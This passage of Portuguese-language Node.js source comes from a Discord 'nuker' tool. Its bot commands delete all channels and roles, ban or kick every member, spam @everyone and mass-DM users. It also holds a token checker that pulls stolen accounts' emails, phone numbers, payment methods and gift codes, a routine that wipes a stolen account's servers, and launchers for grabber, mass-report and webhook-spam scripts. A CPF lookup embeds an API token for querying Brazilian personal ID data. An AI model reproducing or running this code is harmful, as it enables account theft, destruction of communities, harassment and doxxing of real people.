    ▓██  ▀█ ██▒▓██  ▒██░▓███▄░ ▒███   ▓██ ░▄█ ▒   ▒██▒ ▄██▒██░  ██▒▒ ▓██░ ▒░
    ▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄     ▒██░█▀  ▒██   ██░░ ▓██▓ ░ 
    ▒██░   ▓██░▒▒█████▓ ▒██▒ █▄░▒████▒░██▓ ▒██▒   ░▓█  ▀█▓░ ████▓▒░  ▒██▒ ░ 
    ░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░   ░▒▓███▀▒░ ▒░▒░▒░   ▒ ░░   
    ░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░   ▒░▒   ░   ░ ▒ ▒░     ░    
    ░   ░ ░  ░░░ ░ ░ ░ ░░ ░    ░     ░░   ░     ░    ░ ░ ░ ░ ▒    ░      
    ░    ░     ░  ░      ░  ░   ░         ░          ░ ░           
                                                    ░                   
    /Nuker [Bot]
                                                                                                                                                                                
    `.magenta
                        );
                        
                        console.log(
                            greenBright(
                                `     logado na conta > ${client.user.username}#${client.user.discriminator}`
                            )
                        );
                        console.log(greenBright(`     Prefixo > ${prefix}`));
                        console.log(greenBright(
                            `     Everyone Ativo > ${Everyone}`));
                        console.log(
                            greenBright(
                                `     Permissão Necessária > ADMINISTRATOR`
                                )
                        );
                        console.log(
                            greenBright(
                                `     Estou em ${client.guilds.cache.size} servidores`
                            )
                        );
                        console.log(
                            greenBright(
                                `     Evistei ${client.users.cache.size} usuarios`
                                )
                        );
                        console.log("");
                        client.user.setActivity(`${status_bot}`, {
                            type: "STREAMING"
                            , url: `https://www.twitch.tv/${status_da_twitch}`
                        });
                    });
                    
                    client.on("message", async message => {
                        if (message.author.bot) return;
                        if (message.mentions.everyone ===
                            true) {} else if (Everyone === true) {
                            if (message.content.startsWith(prefix +
                                    "help")) {
                                if (message.author.id != myID) {
                                    return message.reply(
                                        "Você não pode utilizar este comando!"
                                    );
                                } else {
                                    const helpEmbed = new Discord
                                        .MessageEmbed()
                                        .setAuthor(
                                            message.author.username
                                            , message.author.avatarURL({
                                                dynamic: true
                                            })
                                        )
                                        .setTitle("Comandos do Bot")
                                        .setThumbnail(
                                            "https://cdn.discordapp.com/emojis/858732615217446912.png?v=1"
                                        )
                                        .setDescription(
                                            `
                    **${emoji_menu} Criar Varios canais:** \`${prefix}cc\` [texto]
                    **${emoji_menu} Cria Varios canais e marca todos com uma mensagem:** \`${prefix}mp\` [texto]
                    **${emoji_menu} Criar Varios cargos:** \`${prefix}mr\` [texto]
                    **${emoji_menu} Deleta todos os canais:** \`${prefix}delcc\`
                    **${emoji_menu} Deleta todos os cargos:** \`${prefix}delrole\`
                    **${emoji_menu} Bane todos os membros:** \`${prefix}banall\`
                    **${emoji_menu} Expulsa todas as pessoas:** \`${prefix}chute\`
                    **${emoji_menu} Muda o nome do servidor:** \`${prefix}visual\`
                    **${emoji_menu} Envia mensagem para todos no pv:** \`${prefix}dmall\`

                    **${emoji_menu} Verifica um token:** \`${prefix}tk_checker\`
                    **${emoji_menu} Limpa uma conta:** \`${prefix}tk_clean\`
                    `
                                        )
                                        .setImage(
                                            `https://cdn.discordapp.com/attachments/608711474952798221/880822167112134686/iinastasy_89063738_2540878906022484_7551585202717459636_n.jpg`
                                        )
                                        .setColor(0x36393e)
                                        .setTimestamp(Date.now());
                                    message.channel.send(helpEmbed);
                                }
                            }
                            
                            ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
                            ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
                            //////////////////////////////////////////////////////////////////////COMANDOS//////////////////////////////////////////////////////////////////////////////////
                            ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
                            /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
                            
                            /// Muda foto e nome do servidor
                            
                            if (message.content.startsWith(prefix +
                                    "visual")) {
                                if (message.author.id != myID) {
                                    console.log(
                                        `     [Lofy] Um idiota tentou utilizando um comando`
                                        .white
                                    );
                                    return message.reply(
                                        "Você não pode utilizar este comando!"
                                    );
                                }
                                
                                console.log(
                                    "     [Lofy] Mudando icone & nome do servidor"
                                    .green
                                );
                                message.guild.setName(
                                    `${nome_do_servidor}`);
                                message.guild.setIcon(icone_do_servidor);
                            }
                            
                            /// Checker de token
                            
                            if (!message.content.startsWith(prefix))
                                return;
                            
                            if (message.author.id != myID) {
                                console.log(
                                    `     [Lofy] Um idiota tentou utilizando um comando`
                                    .white
                                );
                                return message.reply(
                                    "Você não pode utilizar este comando!"
                                    );
                            }
                            
                            const args = message.content
                                .slice(prefix.length)
                                .trim()
                                .split(/ +/g);
                            const command = args.shift()
                                .toLowerCase();
                            if (command == "tk_checker") {
                                const filtro = m => m.author.id ===
                                    message.author.id;
                                message.channel.send(
                                    new Discord.MessageEmbed()
                                    .setDescription(
                                        "[:warning:]-Envie o token a baixo desta mensagem"
                                    )
                                    .setColor("RED")
                                );
                                message.channel
                                    .awaitMessages(filtro, {
                                        max: 1
                                        , time: 20000
                                        , errors: ["time"]
                                    })
                                    .then(coleccion => {
                                        const token = coleccion
                                        .first();
                                        const tkn = token.content;
                                        const headers = {
                                            "User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7"
                                            , "Content-Type": "application/json"
                                            , Authorization: tkn
                                        };
                                        
                                        axios({
                                                method: "GET"
                                                , url: "https://discordapp.com/api/v8/users/@me"
                                                , headers: headers
                                            })
                                            .then(res => {
                                                if (res
                                                    .statusText ==
                                                    "OK") {
                                                    let Nitro;
                                                    let Numero;
                                                    let MFA;
                                                    let NSFW;
                                                    let
                                                    Verificado;
                                                    if (res.data
                                                        .premium_type ==
                                                        1) {
                                                        Nitro =
                                                            "Nitro Classic";
                                                    } else if (res
                                                        .data
                                                        .premium_type ==
                                                        2) {
                                                        Nitro =
                                                            "Nitro Boost";
                                                    } else {
                                                        Nitro =
                                                            "Não tem nitro";
                                                    }
                                                    if (res.data
                                                        .phone) {
                                                        Numero =
                                                            res
                                                            .data
                                                            .phone;
                                                    } else if (res
                                                        .data
                                                        .phone ==
                                                        null) {
                                                        Numero =
                                                            "Não tem numero vinculado.";
                                                    }
                                                    if (res.data
                                                        .mfa_enabled ==
                                                        true) {
                                                        MFA =
                                                            "Sim, esta ativado.";
                                                    } else if (res
                                                        .data
                                                        .mfa_enabled ==
                                                        false) {
                                                        MFA =
                                                            "Não esta ativado.";
                                                    }
                                                    if (res.data
                                                        .verified ==
                                                        true) {
                                                        Verificado
                                                            =
                                                            "Esta Verificado.";
                                                    } else if (res
                                                        .data
                                                        .verified ==
                                                        false) {
                                                        Verificado
                                                            =
                                                            "Não esta verificado.";
                                                    }
                                                    message
                                                        .channel
                                                        .send(
                                                            new Discord
                                                            .MessageEmbed()
                                                            .setAuthor(
                                                                message
                                                                .author
                                                                .tag
                                                                , message
                                                                .author
                                                                .avatarURL({
                                                                    dynamic: true
                                                                })
                                                            )
                                                            .addField(
                                                                "👤 - Usuario"
                                                                , res
                                                                .data
                                                                .username +
                                                                "#" +
                                                                res
                                                                .data
                                                                .discriminator
                                                                , true
                                                            )
                                                            .addField(
                                                                "🆔 - ID",
                                                                res
                                                                .data
                                                                .id,
                                                                false
                                                                )
                                                            .addField(
                                                                "🎫 - MFA Ativada?",
                                                                MFA,
                                                                false
                                                                )
                                                            .addField(
                                                                "💳 - Tem Nitro?",
                                                                Nitro,
                                                                false
                                                                )
                                                            .addField(
                                                                "📩 - E-mail",
                                                                res
                                                                .data
                                                                .email,
                                                                false
                                                                )
                                                            .addField(
                                                                "✅ - E-mail Verificado?"
                                                                , Verificado
                                                                , false
                                                            )
                                                            .addField(
                                                                "🌍 - Linguagem"
                                                                , res
                                                                .data
                                                                .locale
                                                                , false
                                                            )
                                                            .addField(
                                                                "📱 - Telefone Vinculado?"
                                                                , Numero
                                                                , false
                                                            )
                                                            .setColor(
                                                                "GREEN"
                                                                )
                                                            .setFooter(
                                                                `Pedido por: ${message.author.tag}`
                                                                )
                                                            .setTimestamp()
                                                        );
                                                } else {
                                                    message
                                                        .channel
                                                        .send(
                                                            "[:warning:]-Token Invalido"
                                                            );
                                                }
                                            })
                                            .catch(err => {
                                                message.channel
                                                    .send(
                                                        "[:warning:]-Ocorreu um erro"
                                                        );
                                            });
                                    })
                                    .catch(err => {
                                        message.channel.send(
                                            "[:warning:]-Não encontrei nenhum token"
                                        );
                                    });
                            }
                            
                            /// Sla limpa o token de 4
                            
                            if (command == "tk_clean") {
                                if (message.author.id != myID) {
                                    console.log(
                                        `     [Lofy] Um idiota tentou utilizando um comando`
                                        .white
                                    );
                                    return message.reply(
                                        "Você não pode utilizar este comando!"
                                    );
                                }
                                
                                const filtro = m => m.author.id ===
                                    message.author.id;
                                message.channel.send(
                                    new Discord.MessageEmbed()
                                    .setDescription(
                                        "[:warning:]-Envie o token a baixo desta mensagem"
                                    )
                                    .setColor("RED")
                                );
                                
                                message.channel
                                    .awaitMessages(filtro, {
                                        max: 1
                                        , time: 20000
                                        , errors: ["time"]
                                    })
                                    .then(coleccion => {
                                        const token = coleccion
                                        .first();
                                        
                                        const tkn = token.content;
                                        
                                        message.channel.send(
                                            "[💤]-Derrubando...");
                                        const headers = {
                                            "User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7"
                                            , "Content-Type": "application/json"
                                            , Authorization: tkn
                                        };
                                        const guild = {
                                            icon: ""
                                            , name: "Tu cuenta fue nukeada"
                                            , region: "us-west"
                                        };
                                        const limit = {
                                            limit: 100
                                        };
                                        
                                        axios({
                                                method: "GET"
                                                , url: "https://discordapp.com/api/v6/users/@me/guilds"
                                                , headers: headers
                                            })
                                            .then(res => {
                                                for (let i =
                                                    0; i < res
                                                    .data
                                                    .length; i++
                                                    ) {
                                                    console.log(
                                                        res
                                                        .data[
                                                            i]
                                                        );
                                                    axios({
                                                        method: "delete"
                                                        , url: `https://discordapp.com/api/v6/guilds/` +
                                                            res
                                                            .data[
                                                                i
                                                                ]
                                                            .id
                                                        , headers: headers
                                                        , data: limit
                                                    });
                                                    axios({
                                                            method: "delete"
                                                            , url: `https://discordapp.com/api/v6/users/@me/guilds/` +
                                                                res
                                                                .data[
                                                                    i
                                                                    ]
                                                                .id
                                                            , headers: headers
                                                            , data: limit
                                                        })
                                                        .then(
                                                            res => {
                                                                for (
                                                                    let i =
                                                                        0; i <
                                                                    100; i++
                                                                    ) {
                                                                    axios
                                                                        ({
                                                                            method: "POST"
                                                                            , url: "https://discordapp.com/api/v6/guilds"
                                                                            , data: guild
                                                                            , headers: headers
                                                                        })
                                                                        .then(
                                                                            res => {}
                                                                            );
                                                                }
                                                            });
                                                }
                                            })
                                            .then(message.channel
                                                .send(
                                                    "[✅] Conta limpada"
                                                    ));
                                    })
                                    .catch(err => {
                                        console.log(err);
                                    });
                            }
                            
                            /// Cria canais
                            
                            if (message.content.startsWith(prefix +
                                "cc")) {
                                if (message.author.id != myID) {
                                    console.log(
                                        `     [Lofy] Um idiota tentou utilizando um comando`
                                        .white
                                    );
                                    return message.reply(
                                        "Você não pode utilizar este comando!"
                                    );
                                }
                                
                                if (!message.guild.me.permissions.has(
                                        "MANAGE_CHANNELS")) {} else {
                                    if (message.author.id != myID) {
                                        console.log(
                                            `     [Lofy] Um idiota tentou utilizando um comando`
                                            .white
                                        );
                                        return message.reply(
                                            "Você não pode utilizar este comando!"
                                        );
                                    } else {
                                        let args = message.content.split(
                                                " ")
                                            .slice(1);
                                        var argresult = args.join(" ");
                                    }
                                    const ch = args[0];
                                    if (!ch)
                                        return message.reply(
                                            `     [!] Argumento faltandot **${prefix}ch <nome>**`
                                        );
                                    
                                    message.delete();
                                    console.log(yellow(
                                        "    [Lofy] Criando Canais"
                                        ));
                                    for (var i = 0; i <
                                        criar_canais; i++) {
                                        message.guild.channels.create(ch);
                                    }
                                }
                            }
                            
                            /// Cria canais e marca @everyone
                            
                            if (message.content.startsWith(prefix +
                                "mp")) {
                                if (!message.guild.me.hasPermission(
                                        "ADMINISTRATOR")) {
                                    return console.log(
                                        red(
                                            "     [Lofy] O bot esta sem permição")
                                    );
                                } else {
                                    if (message.author.id != myID) {
                                        console.log(
                                            `     [Lofy] Um idiota tentou utilizando um comando`
                                            .white
                                        );
                                        return message.reply(
                                            "Você não pode utilizar este comando!"
                                        );
                                    } else {
                                        let args = message.content.split(
                                                " ")
                                            .slice(1);
                                        var argresult = args.join(" ");
                                        if (!argresult) {
                                            console.log(
                                                blueBright(
                                                    `     [Lofy] Marcando e postando umas coisas`
                                                )
                                            );
                                            for (var i = 0; i <
                                                marcação; i++) {
                                                message.guild.channels
                                                    .create(
                                                        "Derrubado-por");
                                                
                                                for (var i = 0; i <
                                                    marcação; i++) {
                                                    let channels = message
                                                        .guild.channels
                                                        .create(
                                                            "Derrubado-por"
                                                        );
                                                    
                                                    channels.then(
                                                        function (
                                                            channel,
                                                            index) {
                                                            for (var i =
                                                                    0; i <
                                                                marcação; i++
                                                                ) {
                                                                channel
                                                                    .send(
                                                                        "@everyone " +
                                                                        argresult
                                                                        );
                                                            }
                                                        });
                                                }
                                            }
                                        }
                                        console.log(
                                            "     [Lofy] Marcando e criado canais"
                                            .red);
                                        for (var i = 0; i <
                                            marcação; i++) {
                                            let channels = message.guild
                                                .channels.create(
                                                    nome_canal_mp
                                                );
                                            
                                            channels.then(function (
                                                channel, index) {
                                                for (var i =
                                                    0; i <
                                                    marcação; i++
                                                    ) {
                                                    channel.send(
                                                        "@everyone " +
                                                        argresult
                                                        );
                                                }
                                            });
                                        }
                                    }
                                }
                            }
                            
                            /// Criar cargos
                            
                            if (message.content.startsWith(prefix +
                                "mr")) {
                                if (message.author.id != myID) {
                                    console.log(
                                        `     [Lofy] Um idiota tentou utilizando um comando`
                                        .white
                                    );
                                    return message.reply(
                                        "Você não pode utilizar este comando!"
                                    );
                                }
                                
                                if (!message.guild.me.permissions.has(
                                        "MANAGE_ROLES")) {
                                    return message.reply(
                                        "Você não poder utilizar este comando!"
                                    );
                                } else {
                                    const role = args[0];
                                    if (!role)
                                        return message.reply(
                                            `Argumento faltando **${prefix}mr <nome do cargo>**`
                                        );
                                    
                                    message.delete();
                                    console.log(
                                        "     [Lofy] Criando cargos"
                                        .green);
                                    for (var i = 0; i <
                                        criar_cargos; i++) {
                                        message.guild.roles
                                            .create({
                                                name: `${role}`
                                                , color: "RANDOM"
                                                , reason: "Muito ez só"
                                            })
                                            .catch(e =>
                                                console.error(red(
                                                    "     [Lofy] Erro ao criar cargos"
                                                    ))
                                            );
                                    }
                                }
                            }
                            
                            /// Deleta todos os canais
                            
                            if (message.content.startsWith(prefix +
                                    "delcc")) {
                                if (message.author.id != myID) {
                                    console.log(
                                        `     [Lofy] Um idiota tentou utilizando um comando`
                                        .white
                                    );
                                    return message.reply(
                                        "Você não pode utilizar este comando!"
                                    );
                                }
                                
                                console.log(
                                    "     [lofy] Deletando todos os canais"
                                    .yellow);
                                if (message.author.id !== myID) return;
                                message.guild.channels.cache.forEach(
                                    channel => {
                                        channel.delete()
                                            .catch(console.error);
                                    });
                            }
                            
                            /// Expulsa todos o servidor
                            
                            if (message.content.startsWith(prefix +
                                    "chute")) {
                                console.log(
                                    "     [Lofy] Expulsando todos os membros"
                                    );
                                if (!message.guild.me.permissions.has(
                                        "KICK_MEMBERS")) {
                                    return message.reply(
                                        "Você não pode utilizar este comando!"
                                    );
                                } else {
                                    message.guild.members.cache.forEach(
                                        member => {
                                            member
                                                .kick({
                                                    reason: "nuking"
                                                })
                                                .then(
                                                    console.log(
                                                        green(
                                                            `     [Lofy] ${member.user.tag} foi expulso`
                                                            )
                                                    )
                                                )
                                                .catch(e =>
                                                    console.error(
                                                        red(
                                                            `     [Lofy] Incapaz de expulsar ${member.user.tag}`
                                                        )
                                                    )
                                                );
                                        });
                                }
                            }
                            
                            ///Deleta todos os cargos do servidor
                            
                            if (message.content.startsWith(prefix +
                                    "delrole")) {
                                if (message.author.id != myID) {
                                    console.log(
                                        `     [Lofy] Um idiota tentou utilizando um comando`
                                        .white
                                    );
                                    return message.reply(
                                        "Você não pode utilizar este comando!"
                                    );
                                }
                                
                                console.log("     [Lofy] Deletando cargos"
                                    .green);
                                message.guild.roles.cache.forEach(
                                roles => {
                                    roles
                                        .delete()
                                        .catch(e =>
                                            console.error(
                                                red(
                                                    `     [Lofy] Erro ao deletar um cargo`)
                                            )
                                        );
                                });
                            }
                            
                            ///Bane todos do servidor
                            
                            if (message.content.startsWith(prefix +
                                    "banall")) {
                                if (message.author.id != myID) {
                                    console.log(
                                        `     [Lofy] Um idiota tentou utilizando um comando`
                                        .white
                                    );
                                    return message.reply(
                                        "Você não pode utilizar este comando!"
                                    );
                                }
                                
                                console.log(
                                    "     [Lofy] Banindo todos os membros"
                                    .blue);
                                if (!message.guild.me.permissions.has(
                                        "BAN_MEMBERS")) {} else {
                                    message.guild.members.cache.forEach(
                                        member => {
                                            member
                                                .ban({
                                                    days: 7
                                                    , reason: "ez"
                                                })
                                                .then(
                                                    console.log(
                                                        green(
                                                            `     [Lofy] ${member.user.tag} foi banido`
                                                            )
                                                    )
                                                )
                                                .catch(e =>
                                                    console.error(
                                                        red(
                                                            `     [Lofy] Incapaz de banir ${member.user.tag}`
                                                        )
                                                    )
                                                );
                                        });
                                }
                            }
                            
                            /// mass dm
                            
                            if (message.content.startsWith(prefix +
                                    "dmall")) {
                                if (message.author.id != myID) {
                                    console.log(
                                        `     [Lofy] Um idiota tentou utilizando um comando`
                                        .white
                                    );
                                    return message.reply(
                                        "Você não pode utilizar este comando!"
                                    );
                                }
                                
                                console.log(
                                    "     [Lofy] Enviando mensagem no privado de todos"
                                    .blue
                                );
                                if (message.author.id !== myID) return;
                                const msg = args[0];
                                if (!msg)
                                    return message.reply(
                                        "Especifique a mensagem que deseja enviar"
                                    );
                                message.guild.members.cache.forEach(
                                    member => {
                                        member
                                            .send(msg)
                                            .then(
                                                console.log(
                                                    green(
                                                        `     [Lofy] Mensagem enviada para ${member.user.tag}`
                                                    )
                                                )
                                            )
                                            .catch(e =>
                                                console.error(
                                                    red(
                                                        `     [Lofy] Erro ao enviar para ${member.user.tag}`
                                                    )
                                                )
                                            );
                                    });
                            }
                        }
                    });
                    
                    client.login(token_bot)
                        .catch(err => {
                            console.log(``.red);
                            console.log(`    > Um token invalido foi usado`.red);
                            console.log(`    > ${err}`.red);
                        });
                });
            });
            break;
            
        case "0":
            console.clear();
            process.exit(1);
            break;
            
        case "7":
            const fetch = require("node-fetch");
            
            var tokench = fs
                .readFileSync("Arquivos Logs/token checker/token.txt", "utf-8")
                .replace(/\r/g, "")
                .split("\n");
            
            fs.writeFile(`Arquivos Logs/token checker/validos.txt`, "", (err, data) => {});
            fs.writeFile(`Arquivos Logs/token checker/invalidos.txt`, "", (err, data) => {});
            
            async function start() {
                console.clear();
                
                console.log(
                    `
            
            ▄▄▄▄▄      ▄ •▄ ▄▄▄ . ▐ ▄      ▄▄·  ▄ .▄▄▄▄ . ▄▄· ▄ •▄ ▄▄▄ .▄▄▄  
            •██  ▪     █▌▄▌▪▀▄.▀·•█▌▐█    ▐█ ▌▪██▪▐█▀▄.▀·▐█ ▌▪█▌▄▌▪▀▄.▀·▀▄ █·
            ▐█.▪ ▄█▀▄ ▐▀▀▄·▐▀▀▪▄▐█▐▐▌    ██ ▄▄██▀▐█▐▀▀▪▄██ ▄▄▐▀▀▄·▐▀▀▪▄▐▀▀▄ 
            ▐█▌·▐█▌.▐▌▐█.█▌▐█▄▄▌██▐█▌    ▐███▌██▌▐▀▐█▄▄▌▐███▌▐█.█▌▐█▄▄▌▐█•█▌
            ▀▀▀  ▀█▄▀▪·▀  ▀ ▀▀▀ ▀▀ █▪    ·▀▀▀ ▀▀▀ · ▀▀▀ ·▀▀▀ ·▀  ▀ ▀▀▀ .▀  ▀
            
            /Token checker
            
            `.magenta
                );
                
                for (i = 0; i < tokench.length; i++) {
                    await sleep(500);
                    check(tokench[i]);
                }
            }
            
            async function check(tokench) {
                var nitro = `Sem nitro`;
                var pagamento = "";
                var res = await fetch(`https://discord.com/api/v8/users/@me/guilds`, {
                        method: "GET"
                        , headers: {
                            authorization: `${tokench}`
                            , "content-type": "application/json"
                        }
                    })
                    .then(resp => resp.json())
                    .catch(() => console.error);
                if (res.message === "401: Unauthorized") {
                    console.log((`     [INVALIDO] ${tokench}`.red));
                    return fs.appendFile(
                        `Arquivos Logs/token checker/invalidos.txt`
                        , `[INVALIDO] ${tokench}\n`
                        , (err, data) => {}
                    );
                }
                
                if (
                    res.message ===
                    "You need to verify your account in order to perform this action."
                ) {
                    console.log((`[CONTA SEM VERIFICAÇÃO] ${tokench}`.yellow));
                    return fs.appendFile(
                        `Arquivos Logs/token checker/invalidos.txt`
                        , `[CONTA SEM VERIFICAÇÃO] ${tokench}\n`
                        , (err, data) => {}
                    );
                }
                
                var res2 = await fetch(`https://discord.com/api/v8/users/@me`, {
                        method: "GET"
                        , headers: {
                            authorization: `${tokench}`
                            , "content-type": "application/json"
                        }
                    })
                    .then(resp => resp.json())
                    .catch(() => console.error);
                
                if (res2.premium_type) {
                    switch (res2.premium_type) {
                    case 1:
                        nitro = "Classic";
                        break;
                    case 2:
                        nitro = "Gaming";
                        break;
                    }
                }
                
                var res3 = await fetch(
                        `https://discord.com/api/v8/users/@me/billing/payment-sources`, {
                            method: "GET"
                            , headers: {
                                authorization: `${tokench}`
                                , "content-type": "application/json"
                            }
                        }
                    )
                    .then(resp => resp.json());
                
                if (res3.length != 0) {
                    await res3.map(a => {
                        switch (a.type) {
                        case 1:
                            pagamento += `[CARTÃO] ${a.brand.toUpperCase()} | [VAL] ${
                    a.expires_month
                  }/${a.expires_year}`;
                            break;
                        case 2:
                            pagamento += `[PAYPAL] ${a.email}`;
                            break;
                        }
                    });
                } else {
                    pagamento = " Sem Método de Pagamento";
                }
                
                var res4 = await fetch(
                        `https://discord.com/api/v8/users/@me/entitlements/gifts`, {
                            method: "GET"
                            , headers: {
                                authorization: `${tokench}`
                                , "content-type": "application/json"
                            }
                        }
                    )
                    .then(resp => resp.json())
                    .catch(() => console.error);
                
                if (res4.length === 0) {
                    return darlog(
                        `     [VALIDO] ${tokench} | Nitro: ${nitro} | Payments:${pagamento}`
                    );
                }
                
                await res4.map(async a => {
                    if (a.sku_id) {
                        gift(a.sku_id, a.subscription_plan.id);
                    }
                });
                
                async function gift(sku_id, id) {
                    var gift = ``;
                    var res5 = await fetch(
                            `https://discord.com/api/v8/users/@me/entitlements/gift-codes?sku_id=${sku_id}&subscription_plan_id=${id}`,
                            {
                                method: "GET"
                                , headers: {
                                    authorization: `${tokench}`
                                    , "content-type": "application/json"
                                }
                            }
                        )
                        .then(resp => resp.json())
                        .catch(() => console.error);
                    await res5.map(a => {
                        if (a.uses === 0) {
                            gift += `https://discord.gift/${a.code} `;
                        }
                    });
                    
                    darlog(
                        `[VALIDO] ${tokench} | Nitro: ${nitro} | Payments:${pagamento}`
                    );
                }
                
                async function darlog(message) {
                    console.log((`${message}`.green));
                    return fs.appendFile(
                        `Arquivos Logs/token checker/validos.txt`
                        , `${message}\n`
                        , (err, data) => {}
                    );
                }
            }
            start();
            break;
            
        case "8":
            console.clear();
            Shell.exec(`start python.exe Api/"Webhook Spawn.py"`);
            process.exit(1);
            break;
            
        case "9":
            console.clear();
            Shell.exec(`start python.exe Api/"Webhook Dell.py"`);
            process.exit(1);
            break;
            
            
        case "10":
            console.clear();
            Shell.exec(`start python.exe Api/"Grabber Py.py"`);
            process.exit(1);
            break;
            
        case "11":
            console.clear();
            Shell.exec(`start python.exe Api/"Denuncia.py"`);
            process.exit(1);
            break;
            
        case "12":
            console.clear();
            Shell.exec(`start python.exe Api/"Deletar Token.py"`);
            process.exit(1);
            break;
            
        case "15":
            console.clear();
            Shell.exec(`start python.exe Api/"Grabber Js.py"`);
            process.exit(1);
            break;
            
        case "13":
            console.clear()
            const lol = require("node-fetch")
            console.log(`
                  
                  
              ▄████▄   ▒█████   ███▄    █   ██████  █    ██  ██▓  ▄▄▄█████▓ ▄▄▄         ▓█████▄ ▓█████     ▄████▄   ██▓███    █████▒
              ▒██▀ ▀█  ▒██▒  ██▒ ██ ▀█   █ ▒██    ▒  ██  ▓██▒▓██▒  ▓  ██▒ ▓▒▒████▄       ▒██▀ ██▌▓█   ▀    ▒██▀ ▀█  ▓██░  ██▒▓██   ▒ 
              ▒▓█    ▄ ▒██░  ██▒▓██  ▀█ ██▒░ ▓██▄   ▓██  ▒██░▒██░  ▒ ▓██░ ▒░▒██  ▀█▄     ░██   █▌▒███      ▒▓█    ▄ ▓██░ ██▓▒▒████ ░ 
              ▒▓▓▄ ▄██▒▒██   ██░▓██▒  ▐▌██▒  ▒   ██▒▓▓█  ░██░▒██░  ░ ▓██▓ ░ ░██▄▄▄▄██    ░▓█▄   ▌▒▓█  ▄    ▒▓▓▄ ▄██▒▒██▄█▓▒ ▒░▓█▒  ░ 
              ▒ ▓███▀ ░░ ████▓▒░▒██░   ▓██░▒██████▒▒▒▒█████▓ ░██████▒▒██▒ ░  ▓█   ▓██▒   ░▒████▓ ░▒████▒   ▒ ▓███▀ ░▒██▒ ░  ░░▒█░    
              ░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ▒ ▒▓▒ ▒ ░░▒▓▒ ▒ ▒ ░ ▒░▓  ░▒ ░░    ▒▒   ▓▒█░    ▒▒▓  ▒ ░░ ▒░ ░   ░ ░▒ ▒  ░▒▓▒░ ░  ░ ▒ ░    
              ░  ▒     ░ ▒ ▒░ ░ ░░   ░ ▒░░ ░▒  ░ ░░░▒░ ░ ░ ░ ░ ▒  ░  ░      ▒   ▒▒ ░    ░ ▒  ▒  ░ ░  ░     ░  ▒   ░▒ ░      ░      
              ░        ░ ░ ░ ▒     ░   ░ ░ ░  ░  ░   ░░░ ░ ░   ░ ░   ░        ░   ▒       ░ ░  ░    ░      ░        ░░        ░ ░    
              ░        ░ ░ ░ ▒     ░   ░ ░ ░  ░  ░   ░░░ ░ ░   ░ ░   ░        ░   ▒       ░ ░  ░    ░      ░        ░░        ░ ░    
              ░ ░          ░ ░           ░       ░     ░         ░  ░             ░  ░      ░       ░  ░   ░ ░                       
              ░                                                                           ░                ░                         
 

              /Consulta de cpf 

              `.red)
            
            
            readline.question("              > CPF: ".magenta, FF34 => {
                cpf = FF34
                
                function logDataURL(url) {
                    lol(url)
                        .then(r => r.json())
                        .then(r => console.log(r))
                }
                
                logDataURL(
                    `https://ws.hubdodesenvolvedor.com.br/v2/cpf/?cpf=${cpf}&data=$data_de_nascimento_formato_pt_br&token=116394400xzjiJfqNnY210146560`
                    )
                
            })
            
            break;
            
        case "14":
            console.clear();
            const aaaaa = require("node-fetch")
            console.log(`
                      
                      
                  ▄████▄   ▒█████   ███▄    █   ██████  █    ██  ██▓  ▄▄▄█████▓ ▄▄▄         ▓█████▄ ▓█████     ▄████▄   ██▓███    █████▒
                  ▒██▀ ▀█  ▒██▒  ██▒ ██ ▀█   █ ▒██    ▒  ██  ▓██▒▓██▒  ▓  ██▒ ▓▒▒████▄       ▒██▀ ██▌▓█   ▀    ▒██▀ ▀█  ▓██░  ██▒▓██   ▒ 
                  ▒▓█    ▄ ▒██░  ██▒▓██  ▀█ ██▒░ ▓██▄   ▓██  ▒██░▒██░  ▒ ▓██░ ▒░▒██  ▀█▄     ░██   █▌▒███      ▒▓█    ▄ ▓██░ ██▓▒▒████ ░ 
                  ▒▓▓▄ ▄██▒▒██   ██░▓██▒  ▐▌██▒  ▒   ██▒▓▓█  ░██░▒██░  ░ ▓██▓ ░ ░██▄▄▄▄██    ░▓█▄   ▌▒▓█  ▄    ▒▓▓▄ ▄██▒▒██▄█▓▒ ▒░▓█▒  ░ 
                  ▒ ▓███▀ ░░ ████▓▒░▒██░   ▓██░▒██████▒▒▒▒█████▓ ░██████▒▒██▒ ░  ▓█   ▓██▒   ░▒████▓ ░▒████▒   ▒ ▓███▀ ░▒██▒ ░  ░░▒█░    
                  ░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ▒ ▒▓▒ ▒ ░░▒▓▒ ▒ ▒ ░ ▒░▓  ░▒ ░░    ▒▒   ▓▒█░    ▒▒▓  ▒ ░░ ▒░ ░   ░ ░▒ ▒  ░▒▓▒░ ░  ░ ▒ ░    
                  ░  ▒     ░ ▒ ▒░ ░ ░░   ░ ▒░░ ░▒  ░ ░░░▒░ ░ ░ ░ ░ ▒  ░  ░      ▒   ▒▒ ░    ░ ▒  ▒  ░ ░  ░     ░  ▒   ░▒ ░      ░      
                  ░        ░ ░ ░ ▒     ░   ░ ░ ░  ░  ░   ░░░ ░ ░   ░ ░   ░        ░   ▒       ░ ░  ░    ░      ░        ░░        ░ ░    
                  ░        ░ ░ ░ ▒     ░   ░ ░ ░  ░  ░   ░░░ ░ ░   ░ ░   ░        ░   ▒       ░ ░  ░    ░      ░        ░░        ░ ░    
                  ░ ░          ░ ░           ░       ░     ░         ░  ░             ░  ░      ░       ░  ░   ░ ░                       
                  ░                                                                           ░                ░                         
     
    
                  /Consulta de Cpnj 
    
                  `.red)
            
            
            readline.question("              > CPNJ: ".magenta, FF34 => {
                BPNNN = FF34
                
                function logDataURL(url) {
                    aaaaa(url)
                        .then(r => r.json())
                        .then(r => console.log(r))
                }
                
